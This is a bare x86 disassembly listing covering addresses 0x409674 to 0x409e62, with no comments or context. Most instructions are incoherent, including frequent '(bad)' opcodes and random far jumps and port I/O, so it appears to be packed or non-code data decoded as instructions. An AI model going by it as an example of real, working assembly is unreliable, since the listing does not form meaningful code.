  409674:	inc    ebp
  409675:	lods   eax,DWORD PTR ds:[esi]
  409676:	loop   0x4096b6
  409678:	pop    ecx
  409679:	sub    esi,eax
  40967b:	cwde   
  40967c:	pop    eax
  40967d:	xor    BYTE PTR ss:[edx-0x1],dl
  409681:	mov    WORD PTR [ebx],fs
  409683:	ins    DWORD PTR es:[edi],dx
  409684:	xor    edx,DWORD PTR [eax-0x3a4ec680]
  40968a:	test   eax,0x7539673c
  40968f:	imul   BYTE PTR [esi]
  409691:	(bad)  
  409692:	or     dh,ch
  409694:	cmp    ecx,DWORD PTR [edi+0x4a]
  409697:	xchg   esi,eax
  409698:	std    
  409699:	cmp    DWORD PTR [edi-0x57382817],edx
  40969f:	mov    edi,0x2a0d9611
  4096a4:	out    0xf9,eax
  4096a6:	enter  0x9a5d,0x2f
  4096aa:	ret    
  4096ab:	je     0x4096db
  4096ad:	inc    ecx
  4096ae:	mov    esi,0x254948c
  4096b3:	in     eax,dx
  4096b4:	mov    ebp,0x8a7e0d8c
  4096b9:	arpl   WORD PTR [ebp+0x40],bx
  4096bc:	loop   0x4096d6
  4096be:	or     DWORD PTR [eax+edx*1-0x75],eax
  4096c2:	ret    0xac24
  4096c5:	fst    DWORD PTR [eax-0x5098ae73]
  4096cb:	call   0x69f94952
  4096d0:	mov    DWORD PTR [esi*4+0x423f730d],eax
  4096d7:	cmp    al,0x4c
  4096d9:	sub    BYTE PTR [esp+edx*2],dh
  4096dc:	mov    esi,0x7216e094
  4096e1:	sub    cl,cl
  4096e3:	xor    al,0x24
  4096e5:	sti    
  4096e6:	xlat   BYTE PTR ds:[ebx]
  4096e7:	sub    al,0xf
  4096e9:	xor    al,0xd7
  4096eb:	sbb    eax,0x75eb8cb0
  4096f0:	jae    0x4096e4
  4096f2:	ret    
  4096f3:	or     ch,BYTE PTR [edi-0x8f37bab]
  4096f9:	loopne 0x409755
  4096fb:	std    
  4096fc:	mov    esi,0x9777830a
  409701:	adc    BYTE PTR [ecx-0x4907c5e0],dl
  409707:	pop    esp
  409708:	push   ds
  409709:	jmp    0xcc6f:0xa5d9528b
  409710:	add    ch,BYTE PTR [eax]
  409712:	xor    BYTE PTR [esi+0x6f3b9614],dh
  409718:	clc    
  409719:	sahf   
  40971a:	(bad)  
  40971b:	cli    
  40971c:	repz cmp bl,BYTE PTR [esi-0x7a37fc6f]
  409723:	repz jne 0x409722
  409726:	stos   BYTE PTR es:[edi],al
  409727:	cmp    eax,0x432a2e0f
  40972c:	mov    ch,0xe6
  40972e:	mov    ds:0x11dcf6ba,al
  409734:	jecxz  0x409738
  409736:	int    0xcb
  409738:	mov    ebp,0x4e47c28d
  40973d:	(bad)  
  40973e:	lods   eax,DWORD PTR ds:[esi]
  40973f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409740:	xlat   BYTE PTR ds:[ebx]
  409741:	stos   BYTE PTR es:[edi],al
  409742:	mov    al,0x9a
  409744:	mov    ebp,0x7203424b
  409749:	out    dx,eax
  40974a:	dec    ebp
  40974b:	retf   0xa2a4
  40974e:	mov    al,0xcd
  409750:	ret    
  409751:	mov    dl,0x5f
  409753:	push   0xffffff8b
  409755:	retf   0xc591
  409758:	push   0x3246ca65
  40975d:	xchg   esi,eax
  40975e:	mov    ah,0x92
  409760:	ficom  DWORD PTR [ecx]
  409762:	xchg   ebp,eax
  409763:	inc    esp
  409764:	pop    ds
  409765:	stos   BYTE PTR es:[edi],al
  409766:	fs ins DWORD PTR es:[edi],dx
  409768:	hlt    
  409769:	test   DWORD PTR [esi+eax*1+0x49],esp
  40976d:	(bad)  
  40976e:	mov    ecx,0xbd4dfa36
  409773:	retf   
  409774:	adc    DWORD PTR [eax-0x521f379],esp
  40977a:	adc    eax,0x29c29722
  40977f:	xor    ch,cl
  409781:	xor    al,0xbb
  409783:	fsubr  DWORD PTR [ecx]
  409785:	inc    eax
  409786:	mov    DWORD PTR [ebp-0x4],eax
  409789:	cmp    DWORD PTR [ebp-0x4],0x0
  40978d:	lea    eax,[ebp+0x4]
  409790:	jmp    0x409c9b
  409795:	rcl    dh,1
  409797:	ror    ecx,cl
  409799:	ror    ecx,1
  40979b:	(bad)  
  40979c:	(bad)  
  40979e:	(bad)
  4097a2:	push   eax
  4097a3:	je     0x40976f
  4097a5:	and    al,0xf8
  4097a7:	js     0x409821
  4097a9:	push   0x7c
  4097ab:	js     0x409825
  4097ad:	jmp    0xe5b4:0x4992b34b
  4097b4:	fiadd  WORD PTR [edx-0x14]
  4097b7:	mov    edi,edx
  4097b9:	retf   0x4497
  4097bc:	push   ss
  4097bd:	mov    edi,0x6f42d883
  4097c2:	repnz or bl,ch
  4097c5:	jne    0x4097da
  4097c7:	or     DWORD PTR [ebx],edx
  4097c9:	sbb    DWORD PTR ds:0xd3529d31,ebp
  4097cf:	adc    DWORD PTR [ebp+0x66836a09],edx
  4097d5:	push   edi
  4097d6:	call   0xf649b3d9
  4097db:	pop    eax
  4097dc:	retf   0xdc21
  4097df:	mov    esi,0x4dba2986
  4097e4:	xor    eax,0xb547ef67
  4097e9:	sbb    cl,BYTE PTR [eax]
  4097eb:	jp     0x4097ea
  4097ed:	les    ebp,FWORD PTR ds:0x83fa5a5c
  4097f3:	stc    
  4097f4:	adc    DWORD PTR [edx+edx*4],0xffffffa4
  4097f8:	dec    edx
  4097f9:	push   esp
  4097fa:	ret    
  4097fb:	jbe    0x40981e
  4097fd:	or     al,0xe6
  4097ff:	jbe    0x409880
  409801:	mov    bl,0xef
  409803:	or     al,0x1a
  409805:	aad    0xe2
  409807:	pop    es
  409808:	sahf   
  409809:	cld    
  40980a:	push   ss
  40980b:	into   
  40980c:	add    BYTE PTR [eax],dl
  40980e:	cmp    eax,0x3450b64d
  409813:	out    dx,eax
  409814:	adc    BYTE PTR [ebp-0x19aa353b],al
  40981a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40981b:	fwait
  40981c:	mov    WORD PTR [ecx+0x7f],?
  40981f:	xchg   ecx,eax
  409820:	retf   0x9da
  409823:	iret   
  409824:	mov    ebx,0xa1a63bf9
  409829:	or     bl,ch
  40982b:	mov    dl,0xc3
  40982d:	popf   
  40982e:	dec    esp
  40982f:	fs jbe 0x40981f
  409832:	push   ebx
  409833:	mov    ebp,0xc9a01971
  409838:	mov    dl,0xa5
  40983a:	dec    ebp
  40983b:	push   edi
  40983c:	cmp    eax,DWORD PTR [ebx+esi*8-0x4a]
  409840:	inc    eax
  409841:	or     BYTE PTR [ecx],bh
  409843:	sbb    al,0x3e
  409845:	add    DWORD PTR [edi],ebp
  409847:	xor    DWORD PTR ds:0xdf49eb05,ecx
  40984d:	(bad)  
  40984f:	or     BYTE PTR [eax+0x28],bh
  409852:	mov    eax,0xb986ca01
  409857:	or     cl,ah
  409859:	cmc    
  40985a:	mov    ch,0x3
  40985c:	into   
  40985d:	shr    DWORD PTR [eax+0xf08d559],1
  409863:	stos   BYTE PTR es:[edi],al
  409864:	mov    cl,0x8c
  409866:	and    al,ah
  409868:	mov    edi,0x1258ae2c
  40986d:	nop
  40986e:	shr    edi,0x5b
  409871:	xor    dl,BYTE PTR [esi]
  409873:	sar    ebp,cl
  409875:	jnp    0x40987f
  409877:	push   0xfffffffa
  409879:	push   ebx
  40987a:	hlt    
  40987b:	into   
  40987c:	or     al,0xe5
  40987e:	je     0x4098cf
  409880:	and    eax,0xdbb44aea
  409885:	pop    ss
  409886:	call   0x353431c2
  40988b:	dec    BYTE PTR [ebp-0x56e4bd0f]
  409891:	clc    
  409892:	inc    esp
  409893:	(bad)  
  409894:	sbb    DWORD PTR [esi+eiz*1+0xd],edx
  409898:	loop   0x409893
  40989a:	pop    ecx
  40989b:	data16 mov cl,0x16
  40989e:	fld    QWORD PTR [ebx+0x49]
  4098a1:	ja     0x409854
  4098a3:	cmp    bh,ch
  4098a5:	ret    0x7c1a
  4098a8:	ja     0x409866
  4098aa:	ins    DWORD PTR es:[edi],dx
  4098ab:	loop   0x409890
  4098ad:	xor    ch,BYTE PTR [edi]
  4098af:	fwait
  4098b0:	and    BYTE PTR [edi+0x7e],ch
  4098b3:	(bad)  
  4098b4:	ja     0x4098a7
  4098b6:	mov    dh,0xc3
  4098b8:	arpl   WORD PTR [ecx],bp
  4098ba:	sub    eax,DWORD PTR [ebx]
  4098bc:	sbb    bl,BYTE PTR [ebp+ebp*2+0x68965da5]
  4098c3:	call   0x889d:0x4e3d4ebc
  4098ca:	jg     0x4098bb
  4098cc:	cwde   
  4098cd:	or     BYTE PTR [edi-0x2054c5a5],al
  4098d3:	mov    eax,0xb1c2fb1e
  4098d8:	dec    ebp
  4098d9:	(bad)  
  4098da:	push   esp
  4098db:	fild   WORD PTR [esi+esi*4]
  4098de:	frstor [ebx]
  4098e0:	adc    al,BYTE PTR [esi-0x5f]
  4098e3:	daa    
  4098e4:	dec    DWORD PTR [ebx-0x465eeb17]
  4098ea:	mov    ebx,0xc2e95319
  4098ef:	xchg   edi,eax
  4098f0:	xchg   ecx,eax
  4098f1:	daa    
  4098f2:	push   ss
  4098f3:	sbb    eax,0xc302e164
  4098f8:	mov    eax,ds:0xde9788e2
  4098fd:	repnz test eax,0xa48218b0
  409903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409904:	in     eax,dx
  409905:	sti    
  409906:	je     0x4098ba
  409908:	hlt    
  409909:	push   edx
  40990a:	in     eax,0xf
  40990c:	inc    ecx
  40990d:	pop    edi
  40990e:	add    cl,ch
  409910:	mov    eax,0x8afccdfc
  409915:	xchg   ebx,eax
  409916:	bnd jle 0x409904
  409919:	daa    
  40991a:	or     edx,DWORD PTR [edi+0x795dd5ff]
  409920:	mov    ch,bl
  409922:	rcl    ah,1
  409924:	test   DWORD PTR [eax-0x5091f615],ecx
  40992a:	fcomi  st,st(3)
  40992c:	push   esp
  40992d:	(bad)  
  40992f:	jecxz  0x409952
  409931:	and    edx,DWORD PTR [ecx]
  409933:	nop
  409934:	mov    ebx,DWORD PTR [edi]
  409936:	push   cs
  409937:	dec    edx
  409938:	cmp    dh,bl
  40993a:	or     dl,dl
  40993c:	pop    es
  40993d:	ss in  al,0x20
  409940:	cmp    eax,0x2f068b4f
  409945:	loopne 0x40998b
  409947:	mov    ebx,0xba5fbdee
  40994c:	mov    ah,0x29
  40994e:	ret    0x959e
  409951:	adc    eax,0x8f7700d5
  409956:	xor    al,0x92
  409958:	cdq    
  409959:	mov    ebp,0x29234d3b
  40995e:	jno    0x409987
  409960:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409961:	idiv   DWORD PTR [edi]
  409963:	xchg   ecx,eax
  409964:	rol    BYTE PTR [ebp+0x4b],0xe5
  409968:	mov    al,0x3e
  40996a:	sub    al,0x9f
  40996c:	int    0xb
  40996e:	loopne 0x40991b
  409970:	cmp    BYTE PTR [esi-0x6e],bl
  409973:	and    eax,0xda21b2f2
  409978:	push   es
  409979:	mov    al,ds:0x2a8887de
  40997e:	pop    esi
  40997f:	repnz cmp ah,BYTE PTR [edx-0x4d1f38f5]
  409986:	xlat   BYTE PTR ds:[ebx]
  409987:	popf   
  409988:	std    
  409989:	xor    dl,BYTE PTR [eax+0x5474adcd]
  40998f:	fidiv  DWORD PTR [ebp+0x4]
  409992:	pop    es
  409993:	mov    ecx,0xae3a1e9b
  409998:	ins    DWORD PTR es:[edi],dx
  409999:	xchg   DWORD PTR [ecx-0x322a06a8],ecx
  40999f:	aas    
  4099a0:	xchg   ebx,eax
  4099a1:	out    0x64,eax
  4099a3:	push   es
  4099a4:	or     BYTE PTR [esi],al
  4099a6:	ror    DWORD PTR [esi-0x3c],1
  4099a9:	lods   al,BYTE PTR ds:[esi]
  4099aa:	pop    edi
  4099ab:	jge    0x4099cf
  4099ad:	loop   0x409932
  4099af:	add    eax,0x7c5086ad
  4099b4:	stc    
  4099b5:	aaa    
  4099b6:	popa   
  4099b7:	or     edx,edi
  4099b9:	std    
  4099ba:	mov    al,BYTE PTR [esi+edx*4+0x4d]
  4099be:	pop    ss
  4099bf:	shl    ch,1
  4099c1:	ins    DWORD PTR es:[edi],dx
  4099c2:	add    cl,BYTE PTR es:[edx-0x19]
  4099c6:	or     dh,0xb0
  4099c9:	jae    0x409a44
  4099cb:	sbb    eax,0xbd5df52b
  4099d0:	mov    eax,ebx
  4099d2:	sub    eax,0x47b9e16f
  4099d7:	rol    BYTE PTR [esi-0x73],0x2d
  4099db:	in     eax,dx
  4099dc:	sar    DWORD PTR [ebp+0x63],0x45
  4099e0:	push   cs
  4099e1:	xchg   ecx,eax
  4099e2:	cdq    
  4099e3:	inc    edi
  4099e4:	inc    edi
  4099e5:	sar    DWORD PTR [ecx],0x60
  4099e8:	fs imul ecx
  4099eb:	fs pop ebp
  4099ed:	mov    edx,DWORD PTR [ecx-0x53a55a7]
  4099f3:	sub    cl,BYTE PTR ds:0x30d10822
  4099f9:	xchg   ah,al
  4099fb:	jnp    0x4099ff
  4099fd:	or     BYTE PTR [esi-0x26d8de4c],0xac
  409a04:	stos   BYTE PTR es:[edi],al
  409a05:	inc    esp
  409a06:	pop    eax
  409a07:	jo     0x4099f2
  409a09:	idiv   DWORD PTR fs:[esi]
  409a0c:	lds    ebp,FWORD PTR [ebx-0x10febc67]
  409a12:	sub    DWORD PTR [edx],ecx
  409a14:	mov    ch,0x82
  409a16:	sti    
  409a17:	mov    esi,0x8174882f
  409a1c:	(bad)  
  409a1d:	push   ds
  409a1e:	dec    ebx
  409a1f:	adc    DWORD PTR [edx],eax
  409a21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a22:	mov    al,0xca
  409a24:	xchg   DWORD PTR [ecx-0x3b],eax
  409a27:	sbb    BYTE PTR [eax-0x56aabb50],al
  409a2d:	jmp    0x409a59
  409a2f:	pop    ds
  409a30:	sub    BYTE PTR [edx+0x7ebd3564],0xca
  409a37:	sbb    edi,edx
  409a39:	and    al,0x62
  409a3b:	ficomp DWORD PTR [ebx-0x6a48fc2b]
  409a41:	mov    edx,0x9200a45c
  409a46:	sbb    al,0x1f
  409a48:	mov    ds:0x82b74f22,al
  409a4d:	push   edi
  409a4e:	push   ebp
  409a4f:	mov    ebp,0x7f6669e1
  409a54:	(bad)  
  409a55:	fisubr WORD PTR [eax-0x66e7c65f]
  409a5b:	mov    esp,DWORD PTR [edi]
  409a5d:	scas   eax,DWORD PTR es:[edi]
  409a5e:	test   BYTE PTR [eax-0x5e7d19dd],0x6d
  409a65:	rol    ch,0xa1
  409a68:	mov    esp,0xf8fbd3a2
  409a6d:	push   edx
  409a6e:	mov    cl,0xd8
  409a70:	adc    edi,DWORD PTR [ebp-0x3]
  409a73:	sub    al,0xdd
  409a75:	pusha  
  409a76:	mov    ebx,0x2d565315
  409a7b:	add    BYTE PTR [edx+ecx*1-0x7d3b8d99],ah
  409a82:	test   ch,0x58
  409a85:	inc    esp
  409a86:	xchg   BYTE PTR [ecx+0x1b],cl
  409a89:	mov    dh,0x53
  409a8b:	popf   
  409a8c:	mov    cl,0xb9
  409a8e:	or     eax,0xfd1e7ed
  409a93:	idiv   DWORD PTR [esi+0x4dab19b2]
  409a99:	cmp    bl,dh
  409a9b:	mov    esp,0x331d7aae
  409aa0:	mov    eax,ds:0xf6aca21e
  409aa5:	push   ebx
  409aa6:	popa   
  409aa7:	stc    
  409aa8:	ja     0x409a77
  409aaa:	push   ebp
  409aab:	pop    ss
  409aac:	and    DWORD PTR [ebx-0x272d54f2],ebx
  409ab2:	iret   
  409ab3:	stos   DWORD PTR es:[edi],eax
  409ab4:	popa   
  409ab5:	mov    ds:0xf9508c7a,eax
  409aba:	jns    0x409adf
  409abc:	outs   dx,DWORD PTR ds:[esi]
  409abd:	sub    BYTE PTR [esp+ecx*1+0x2],bh
  409ac1:	adc    esi,DWORD PTR [ebx+0x6468480]
  409ac7:	hlt    
  409ac8:	dec    esi
  409ac9:	popa   
  409aca:	popf   
  409acb:	mov    ch,0x6d
  409acd:	stos   DWORD PTR es:[edi],eax
  409ace:	xor    esi,DWORD PTR [edx+ebx*8+0x17]
  409ad2:	loope  0x409b02
  409ad4:	push   edi
  409ad5:	in     al,0xc9
  409ad7:	(bad)  
  409ad8:	mov    bh,0x31
  409ada:	int3   
  409adb:	dec    ecx
  409adc:	cmp    eax,0x2874db3e
  409ae1:	out    0xfe,eax
  409ae3:	sti    
  409ae4:	xchg   DWORD PTR [edi+0x135ab3f2],esi
  409aea:	loope  0x409ae9
  409aec:	xor    al,dh
  409aee:	sub    eax,DWORD PTR [ebp+0x40]
  409af1:	(bad)  
  409af2:	xor    BYTE PTR [ebp-0x26811a40],bh
  409af8:	add    DWORD PTR [edi+0x401714ba],0x7cb4ed9d
  409b02:	xor    ecx,DWORD PTR [eax+esi*2]
  409b05:	fisubr DWORD PTR [eax+0x697e05e0]
  409b0b:	shl    eax,1
  409b0d:	push   ecx
  409b0e:	scas   eax,DWORD PTR es:[edi]
  409b0f:	and    dh,0x3e
  409b12:	mov    ebp,0xb21ceb16
  409b17:	iret   
  409b18:	fcomp  QWORD PTR [esi-0x7c]
  409b1b:	fwait
  409b1c:	mov    bl,0x7f
  409b1e:	repnz aas 
  409b20:	push   ebx
  409b21:	inc    eax
  409b22:	inc    esi
  409b23:	cmp    dl,dh
  409b25:	inc    ebp
  409b26:	and    BYTE PTR [edi],dh
  409b28:	or     ah,dl
  409b2a:	sahf   
  409b2b:	adc    al,0x95
  409b2d:	jno    0x409ad9
  409b2f:	xchg   edx,eax
  409b30:	or     DWORD PTR [edi-0x60cd122d],0xc84b92e1
  409b3a:	js     0x409bbb
  409b3c:	into   
  409b3d:	fcomp  QWORD PTR [ebx]
  409b3f:	aad    0xa2
  409b41:	pop    eax
  409b42:	popf   
  409b43:	sbb    BYTE PTR [eax-0x5867ecd8],al
  409b49:	ds push ss
  409b4b:	ret    0x24b4
  409b4e:	pop    esi
  409b4f:	gs inc eax
  409b51:	cmp    dl,ch
  409b53:	mov    ecx,0x9a35100c
  409b58:	(bad)  
  409b59:	ins    DWORD PTR es:[edi],dx
  409b5a:	jmp    0x81bf:0x3fafc6c8
  409b61:	loopne 0x409b52
  409b63:	in     al,0x84
  409b65:	ins    DWORD PTR es:[edi],dx
  409b66:	xchg   esp,eax
  409b67:	scas   al,BYTE PTR es:[edi]
  409b68:	repnz repnz and ebp,DWORD PTR [ebp-0x71]
  409b6d:	inc    DWORD PTR [ebp-0x61]
  409b70:	repz cli 
  409b72:	jmp    0xd81d74c4
  409b77:	mov    bh,0x22
  409b79:	(bad)  
  409b7a:	rcr    DWORD PTR [esi],cl
  409b7c:	push   edx
  409b7d:	repz dec ecx
  409b7f:	stc    
  409b80:	pop    edx
  409b81:	es inc esi
  409b83:	xchg   ebp,eax
  409b84:	pop    ebx
  409b85:	xlat   BYTE PTR ds:[ebx]
  409b86:	cmp    DWORD PTR [eax],ebp
  409b88:	ret    
  409b89:	lock xlat BYTE PTR gs:[ebx]
  409b8c:	aas    
  409b8d:	push   0x40
  409b8f:	cld    
  409b90:	sahf   
  409b91:	repnz add ah,BYTE PTR [esi-0x1c566229]
  409b98:	cmp    eax,DWORD PTR [esi*1+0x6b1f8939]
  409b9f:	push   es
  409ba0:	pop    ds
  409ba1:	dec    eax
  409ba2:	pmuludq mm4,QWORD PTR [esi]
  409ba5:	sub    ebp,esi
  409ba7:	sbb    DWORD PTR [ecx+0x1dac6862],0x4b18bf29
  409bb1:	pusha  
  409bb2:	rol    BYTE PTR [edx-0x6307ebe4],1
  409bb8:	add    al,0x9
  409bba:	addr16 daa 
  409bbc:	daa    
  409bbd:	pop    ds
  409bbe:	inc    eax
  409bbf:	sbb    eax,0x98d0112
  409bc4:	dec    ecx
  409bc5:	mov    esp,0x4f0b248e
  409bca:	hlt    
  409bcb:	mul    bl
  409bcd:	out    0xe3,al
  409bcf:	mov    bl,0xa
  409bd1:	inc    ebx
  409bd2:	mov    bh,0x41
  409bd4:	dec    ebp
  409bd5:	mov    esi,ecx
  409bd7:	or     eax,0xc82ef960
  409bdc:	paddsw mm1,mm5
  409bdf:	inc    esi
  409be0:	out    0x12,eax
  409be2:	xor    cl,BYTE PTR ds:0xe8cc587d
  409be8:	out    dx,eax
  409be9:	push   ebp
  409bea:	mov    bl,0xa2
  409bec:	adc    bh,BYTE PTR [ebx+0x40]
  409bef:	fwait
  409bf0:	dec    edx
  409bf1:	call   0xbd35243a
  409bf6:	out    dx,al
  409bf7:	sbb    eax,0xcd268938
  409bfc:	(bad)  
  409bfd:	ficomp DWORD PTR [edx+esi*4+0x2bc48bf4]
  409c04:	dec    esi
  409c05:	dec    eax
  409c06:	das    
  409c07:	loop   0x409c65
  409c09:	les    edx,FWORD PTR [esi+esi*1+0x1a23a7dc]
  409c10:	xor    DWORD PTR [esp+0x7a],0x9c5e0ce3
  409c18:	push   ecx
  409c19:	popa   
  409c1a:	cwde   
  409c1b:	pop    edx
  409c1c:	push   ss
  409c1d:	shl    DWORD PTR [esi],cl
  409c1f:	cmp    al,0x66
  409c21:	push   edi
  409c22:	or     eax,DWORD PTR [edx+0x18]
  409c25:	xor    al,BYTE PTR [esi+0x32]
  409c28:	dec    edx
  409c29:	fimul  DWORD PTR [edi-0x76]
  409c2c:	pop    es
  409c2d:	out    dx,eax
  409c2e:	add    esp,esi
  409c30:	loope  0x409c66
  409c32:	mov    al,0x6b
  409c34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c35:	loop   0x409c5b
  409c37:	xchg   BYTE PTR [ecx-0x7c],dh
  409c3a:	or     al,0x78
  409c3c:	mov    eax,0x46d176b8
  409c41:	in     al,0x39
  409c43:	retf   
  409c44:	adc    edx,esi
  409c46:	pop    esp
  409c47:	sub    edi,DWORD PTR [edi-0x75049cf]
  409c4d:	jp     0x409c8a
  409c4f:	or     BYTE PTR [edi-0x44],0xe5
  409c53:	std    
  409c54:	sbb    al,0xe1
  409c56:	ret    0x5cad
  409c59:	sbb    ebp,0x31
  409c5c:	pop    ss
  409c5d:	not    DWORD PTR [edi+0x12]
  409c60:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c62:	inc    ecx
  409c63:	pop    edi
  409c64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c65:	call   0x62788344
  409c6a:	ja     0x409c1a
  409c6c:	stos   BYTE PTR es:[edi],al
  409c6d:	call   0x7947ca90
  409c72:	ror    ch,cl
  409c74:	cs cmp eax,0x2a53ecd5
  409c7a:	in     eax,0xfd
  409c7c:	aad    0x15
  409c7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c7f:	pop    ebp
  409c80:	pop    eax
  409c81:	push   0xeb60d6ec
  409c86:	jb     0x409c2a
  409c88:	mov    ebp,DWORD PTR [eax]
  409c8a:	daa    
  409c8b:	prefetch BYTE PTR [ecx+0x4ab1658a]
  409c92:	cmp    al,0x2a
  409c94:	add    al,0x11
  409c96:	nop
  409c97:	jecxz  0x409c79
  409c99:	adc    eax,DWORD PTR [ecx+ecx*4]
  409c9c:	inc    ebp
  409c9d:	enter  0x6e9,0x5
  409ca1:	add    BYTE PTR [eax],al
  409ca3:	ret    
  409ca4:	ror    ch,1
  409ca6:	(bad)  
  409ca7:	fld    st(5)
  409ca9:	(bad)  
  409cab:	outs   dx,BYTE PTR ds:[esi]
  409cac:	js     0x409c6d
  409cae:	inc    esi
  409caf:	mov    ebp,0x161b054f
  409cb4:	cmp    DWORD PTR [eax+0x78],0x6a
  409cb8:	jl     0x409d32
  409cba:	js     0x409cb2
  409cbc:	add    eax,edx
  409cbe:	sbb    eax,0x61cc60cc
  409cc3:	cmp    BYTE PTR [ebx-0x14af2a4c],ah
  409cc9:	jns    0x409d3e
  409ccb:	push   edi
  409ccc:	shl    DWORD PTR [ebx-0x2e],cl
  409ccf:	xor    DWORD PTR [ecx-0x13],esp
  409cd2:	bound  ebx,QWORD PTR [ecx]
  409cd4:	cmp    bl,BYTE PTR [ebx-0x26b27d63]
  409cda:	lds    ebp,FWORD PTR [esi+0x3a24aade]
  409ce0:	cld    
  409ce1:	push   0xffffff9f
  409ce3:	out    0x28,eax
  409ce5:	inc    esi
  409ce6:	enter  0xd25e,0xbd
  409cea:	dec    ebx
  409ceb:	(bad)  
  409cec:	out    0x67,eax
  409cee:	(bad)  
  409cef:	and    BYTE PTR [ecx-0x62],ch
  409cf2:	icebp  
  409cf3:	shr    BYTE PTR [ebx-0x1d],cl
  409cf6:	in     al,0xd3
  409cf8:	add    ecx,esi
  409cfa:	inc    esi
  409cfb:	push   cs
  409cfc:	bound  esi,QWORD PTR [eax-0x52]
  409cff:	xchg   edx,eax
  409d00:	enter  0xac46,0x7d
  409d04:	aam    0xf2
  409d06:	push   edi
  409d07:	sub    eax,0xba3d9f1f
  409d0c:	jne    0x409ce6
  409d0e:	xor    DWORD PTR [esi],0x27
  409d11:	or     bh,ah
  409d13:	loope  0x409d6c
  409d15:	sub    cl,BYTE PTR [edx+0x424e5899]
  409d1b:	fdivr  QWORD PTR ds:0x67b176d1
  409d21:	xchg   DWORD PTR [edi-0x7d],ecx
  409d24:	ds adc al,0x30
  409d27:	jge    0x409d14
  409d29:	xchg   ecx,eax
  409d2a:	pop    ss
  409d2b:	shr    BYTE PTR [edi],0x15
  409d2e:	or     dl,ah
  409d30:	dec    esp
  409d31:	inc    edx
  409d32:	cmc    
  409d33:	push   esi
  409d34:	in     eax,0x33
  409d36:	xor    eax,DWORD PTR [esi]
  409d38:	mov    dl,0xab
  409d3a:	shr    BYTE PTR [ecx+0x442018a2],0xf3
  409d41:	jbe    0x409d92
  409d43:	cwde   
  409d44:	mul    cl
  409d46:	inc    ebx
  409d47:	push   edx
  409d48:	popa   
  409d49:	std    
  409d4a:	mov    al,al
  409d4c:	xor    BYTE PTR cs:[ebp-0x7c],ch
  409d50:	add    al,0x74
  409d52:	mov    ebp,0xedefbbdc
  409d57:	loopne 0x409da1
  409d59:	(bad)  
  409d5a:	dec    ebp
  409d5b:	add    eax,0x295af443
  409d60:	mov    ebp,0x50b27738
  409d65:	popa   
  409d66:	sar    DWORD PTR [esi-0x48],0xc
  409d6a:	fxch   st(7)
  409d6c:	dec    esi
  409d6d:	enter  0x72fb,0x38
  409d71:	mov    WORD PTR [ebx+esi*8+0xc21d6bd],gs
  409d78:	mov    eax,0x1918b8d3
  409d7d:	push   ds
  409d7e:	shl    dl,cl
  409d80:	dec    ecx
  409d81:	or     edx,ebp
  409d83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d84:	sti    
  409d85:	test   eax,0x155b1ea2
  409d8a:	stc    
  409d8b:	out    0x8b,al
  409d8d:	ret    0xc816
  409d90:	add    ecx,DWORD PTR [ecx+0x19]
  409d93:	das    
  409d94:	inc    edi
  409d95:	sahf   
  409d96:	mov    WORD PTR [ebp-0xd616a24],fs
  409d9c:	out    0xe4,eax
  409d9e:	mov    dl,0x38
  409da0:	in     al,0xd4
  409da2:	into   
  409da3:	sub    BYTE PTR [eax+0x5],dl
  409da6:	lock xlat BYTE PTR ds:[ebx]
  409da8:	loope  0x409d65
  409daa:	or     DWORD PTR [bx+si],ebp
  409dad:	mov    ch,0x2
  409daf:	repz out 0xd8,eax
  409db2:	scas   eax,DWORD PTR es:[edi]
  409db3:	mov    ss,ebp
  409db5:	cdq    
  409db6:	retf   0x8430
  409db9:	jl     0x409d5a
  409dbb:	adc    edi,DWORD PTR [edx-0x30]
  409dbe:	cmp    ch,BYTE PTR [esi+0x1]
  409dc1:	sbb    edx,DWORD PTR [edi-0x455510c8]
  409dc7:	mov    esi,0x8c191a5c
  409dcc:	jmp    0x1ea5bd57
  409dd1:	fdiv   DWORD PTR [eax+0x2a]
  409dd4:	mov    edx,0x1c14bc17
  409dd9:	mov    ah,0x3c
  409ddb:	aaa    
  409ddc:	pop    ds
  409ddd:	jmp    0xe5044fbc
  409de2:	xchg   BYTE PTR [ecx-0x7fa49127],bh
  409de8:	sub    cl,BYTE PTR [edi-0x34]
  409deb:	pusha  
  409dec:	imul   ebp,DWORD PTR [ebp+ebp*2-0x57f820be],0x54
  409df4:	(bad)  [esp+ebx*4]
  409df7:	mov    WORD PTR [ebp-0x60a2528b],ss
  409dfd:	add    al,0x42
  409dff:	in     eax,dx
  409e00:	xlat   BYTE PTR ds:[ebx]
  409e01:	shl    DWORD PTR [ecx+eax*4],1
  409e04:	cmp    ebp,esp
  409e06:	cmp    DWORD PTR [edi+ebp*4+0x12bda182],esi
  409e0d:	cli    
  409e0e:	retf   
  409e0f:	je     0x409e56
  409e11:	jbe    0x409dc9
  409e13:	sbb    bh,BYTE PTR [edi+0x77e53e45]
  409e19:	rcr    DWORD PTR [edx+0x11270f6e],cl
  409e1f:	fidiv  WORD PTR [eax]
  409e21:	sub    dh,BYTE PTR [eax+0xddd2d62]
  409e27:	adc    ecx,DWORD PTR [eax]
  409e29:	mov    al,0xa8
  409e2b:	add    al,0xca
  409e2d:	inc    edx
  409e2e:	ss push 0x183bf808
  409e34:	or     eax,0xcac9899e
  409e39:	and    DWORD PTR ds:[esi],esi
  409e3c:	sar    BYTE PTR [ebx+0x79],0x77
  409e40:	mov    bl,0xa8
  409e42:	mov    BYTE PTR [ecx],dl
  409e44:	and    esp,DWORD PTR [ecx-0x24]
  409e47:	frstor [edx-0x865a9cd]
  409e4d:	mov    bh,0x18
  409e4f:	mov    ah,0xe9
  409e51:	pop    ecx
  409e52:	mov    ch,0xe1
  409e54:	test   DWORD PTR [edi],esi
  409e56:	sbb    ebx,DWORD PTR [esi-0x1]
  409e59:	(bad)  
  409e5a:	or     al,0xba
  409e5c:	leave  
  409e5d:	mov    ebx,0xbd086f15
  409e62:	arpl   WORD PTR [eax+0xbb58db3],dx
